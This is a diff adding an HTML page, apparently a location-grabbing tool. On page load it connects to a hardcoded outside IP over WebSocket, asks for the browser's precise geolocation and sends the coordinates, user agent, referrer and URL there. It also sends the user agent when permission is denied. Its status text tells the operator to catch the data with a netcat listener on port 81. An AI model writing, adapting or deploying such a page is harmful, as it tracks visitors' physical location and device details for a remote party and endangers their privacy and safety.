@@ -1,0 +1,251 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Geolocation WebSocket Client</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: #f5f5f5;
+        }
+        .status {
+            padding: 15px;
+            margin: 10px 0;
+            border-radius: 5px;
+            font-weight: bold;
+        }
+        .success { background-color: #d4edda; color: #155724; }
+        .error { background-color: #f8d7da; color: #721c24; }
+        .warning { background-color: #fff3cd; color: #856404; }
+        .info { background-color: #d1ecf1; color: #0c5460; }
+    </style>
+</head>
+<body>
+    <h1>Geolocation WebSocket Client</h1>
+    
+    <div id="statusContainer">
+        <div id="initialStatus" class="status info">
+            🔄 Initializing WebSocket connection...
+        </div>
+    </div>
+
+    <script>
+        // Configuration
+        const WS_SERVER = 'ws://197.44.116.188:81';
+        const MAX_RETRIES = 3;
+        const RETRY_DELAY = 2000; // 2 seconds
+
+        class GeolocationWebSocketClient {
+            constructor() {
+                this.retryCount = 0;
+                this.hasSentData = false;
+                this.ws = null;
+                this.isConnected = false;
+                this.statusContainer = document.getElementById('statusContainer');
+                this.initialStatus = document.getElementById('initialStatus');
+            }
+
+            // Update status display
+            updateStatus(message, type = 'info') {
+                this.initialStatus.innerHTML = message;
+                this.initialStatus.className = `status ${type}`;
+                console.log(`[${type.toUpperCase()}] ${message}`);
+            }
+
+            // Initialize WebSocket connection
+            initWebSocket() {
+                try {
+                    this.updateStatus('🔌 Connecting to WebSocket server...', 'info');
+                    
+                    this.ws = new WebSocket(WS_SERVER);
+                    
+                    this.ws.onopen = () => {
+                        this.isConnected = true;
+                        this.retryCount = 0;
+                        this.updateStatus('✅ WebSocket connected! Getting location...', 'success');
+                        this.getGeolocation();
+                    };
+                    
+                    this.ws.onmessage = (event) => {
+                        console.log('📨 Server response:', event.data);
+                    };
+                    
+                    this.ws.onerror = (error) => {
+                        console.error('WebSocket error:', error);
+                        this.updateStatus('❌ WebSocket connection error', 'error');
+                    };
+                    
+                    this.ws.onclose = (event) => {
+                        this.isConnected = false;
+                        if (!this.hasSentData) {
+                            this.handleWebSocketDisconnect();
+                        }
+                    };
+                    
+                } catch (error) {
+                    console.error('WebSocket initialization error:', error);
+                    this.updateStatus('❌ Failed to create WebSocket connection', 'error');
+                }
+            }
+
+            // Handle WebSocket disconnection
+            handleWebSocketDisconnect() {
+                this.retryCount++;
+                if (this.retryCount < MAX_RETRIES) {
+                    this.updateStatus(
+                        `🔌 Connection lost (attempt ${this.retryCount}/${MAX_RETRIES}). Reconnecting...`,
+                        'warning'
+                    );
+                    setTimeout(() => this.initWebSocket(), RETRY_DELAY);
+                } else {
+                    this.updateStatus(
+                        `❌ Failed to connect after ${MAX_RETRIES} attempts.<br>Please check if netcat is running: <code>nc -lvp 81</code>`,
+                        'error'
+                    );
+                }
+            }
+
+            // Send geolocation data via WebSocket
+            sendGeolocationData(latitude, longitude, accuracy) {
+                if (this.hasSentData) {
+                    console.log('Data already sent, skipping duplicate');
+                    return;
+                }
+
+                if (!this.isConnected || !this.ws) {
+                    this.updateStatus('❌ WebSocket not connected. Cannot send data.', 'error');
+                    return;
+                }
+
+                const timestamp = new Date().toISOString();
+                const userAgent = navigator.userAgent;
+                
+                // Create data object
+                const locationData = {
+                    type: 'geolocation',
+                    latitude: latitude,
+                    longitude: longitude,
+                    accuracy: accuracy,
+                    timestamp: timestamp,
+                    userAgent: userAgent,
+                    referrer: document.referrer || 'direct',
+                    url: window.location.href
+                };
+
+                this.updateStatus('📡 Sending geolocation data via WebSocket...', 'info');
+
+                try {
+                    // Send as JSON string
+                    this.ws.send(JSON.stringify(locationData, null, 2));
+                    
+                    this.hasSentData = true;
+                    this.updateStatus(
+                        `✅ Geolocation data sent successfully via WebSocket!<br>
+                         📍 Location: ${latitude.toFixed(6)}, ${longitude.toFixed(6)}<br>
+                         📏 Accuracy: ${accuracy} meters<br>
+                         ⏰ Time: ${new Date(timestamp).toLocaleString()}<br>
+                         🔗 Check your netcat terminal for received data`,
+                        'success'
+                    );
+                    
+                    // Close connection after sending data
+                    setTimeout(() => {
+                        if (this.ws) {
+                            this.ws.close();
+                        }
+                    }, 2000);
+                    
+                } catch (error) {
+                    console.error('Error sending WebSocket message:', error);
+                    this.updateStatus('❌ Failed to send data via WebSocket', 'error');
+                }
+            }
+
+            // Get current geolocation
+            getGeolocation() {
+                if (!navigator.geolocation) {
+                    this.updateStatus('❌ Geolocation is not supported by this browser.', 'error');
+                    return;
+                }
+
+                const options = {
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 60000
+                };
+
+                this.updateStatus('📍 Requesting geolocation access...', 'info');
+
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+                        const acc = position.coords.accuracy;
+
+                        this.updateStatus('✅ Geolocation access granted!', 'success');
+                        this.sendGeolocationData(lat, lon, acc);
+                    },
+                    (error) => {
+                        this.handleGeolocationError(error);
+                    },
+                    options
+                );
+            }
+
+            // Handle geolocation errors
+            handleGeolocationError(error) {
+                let errorMessage = '';
+                
+                switch(error.code) {
+                    case error.PERMISSION_DENIED:
+                        errorMessage = '❌ Geolocation permission denied by user.';
+                        break;
+                    case error.POSITION_UNAVAILABLE:
+                        errorMessage = '❌ Location information unavailable.';
+                        break;
+                    case error.TIMEOUT:
+                        errorMessage = '❌ Location request timed out.';
+                        break;
+                    default:
+                        errorMessage = '❌ An unknown error occurred.';
+                        break;
+                }
+
+                this.updateStatus(`${errorMessage}<br>Please refresh and allow location access.`, 'error');
+                
+                // Send error notification via WebSocket if connected
+                if (this.isConnected && this.ws) {
+                    const errorData = {
+                        type: 'error',
+                        errorCode: error.code,
+                        message: errorMessage,
+                        userAgent: navigator.userAgent,
+                        timestamp: new Date().toISOString()
+                    };
+                    this.ws.send(JSON.stringify(errorData));
+                }
+            }
+
+            // Initialize the client
+            init() {
+                this.updateStatus('🚀 Starting geolocation WebSocket client...', 'info');
+                this.initWebSocket();
+            }
+        }
+
+        // Initialize the client when page loads
+        const client = new GeolocationWebSocketClient();
+        
+        // Wait for page to load completely
+        if (document.readyState === 'loading') {
+            document.addEventListener('DOMContentLoaded', () => client.init());
+        } else {
+            client.init();
+        }
+    </script>
+</body>
+</html>
